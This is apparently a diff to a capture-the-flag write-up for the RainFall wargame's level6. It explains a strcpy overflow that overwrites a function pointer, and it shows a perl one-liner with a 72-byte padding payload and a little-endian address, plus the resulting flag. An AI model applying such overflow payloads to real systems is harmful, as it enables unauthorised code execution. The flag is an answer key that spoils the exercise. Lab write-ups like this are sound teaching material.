@@ -1,4 +1,9 @@
-Using eip offset finder we find the offset is 72
+After reverse engineering the program, we can that we need to redirect program's
+execution to n(). There is a function pointer assigned in the main, and we can
+overflow the strcpy to modify the pointer before the function is called.
+
+Using eip offset finder we find the offset is 72, so we just need to write 72
+random characters and then write n()'s address in little endian.
 
 level6@RainFall:~$ ./level6 `perl -e 'print "A"x72 . "\x54\x84\x04\x08"'`
 f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
